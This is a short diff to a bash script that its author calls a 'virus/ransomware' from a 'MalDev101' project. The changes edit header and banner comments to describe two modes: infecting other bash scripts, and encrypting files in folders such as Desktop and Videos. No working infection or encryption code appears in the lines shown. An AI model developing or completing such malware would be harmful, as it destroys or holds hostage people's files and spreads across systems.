@@ -29,7 +29,7 @@
 # Created by TheG0df2ther a MalDev101 project
 # This is only an experiment but it can be dangerous.
 # I am not responsible for the damage.
-# This is a virus that works on unix systems with bash installed.
+# This is a virus/ransomware that works on unix systems with bash installed.
 # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
 
 SHEBANG="#!/bin/bash"
@@ -135,11 +135,17 @@ function banner_text() {
    # Created by TheG0df2ther a MalDev101 project
    # This is only an experiment but it can be dangerous.
    # I am not responsible for the damage.
-   # This is a virus that works on unix systems with bash installed.
+   # This is a virus/ransomware that works on unix systems with bash installed.
    # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
-   
+   #
+   # If virus mode:
+   #
    # Check if files are written in bash then start infecting them.
-   # The virus ignores non bash scripts and already infected files "
+   # The virus ignores non bash scripts and already infected files
+   #
+   # If ransomware mode:
+   #
+   # Encrypt files in Desktop, Videos ... "
 }
 
 function error() {
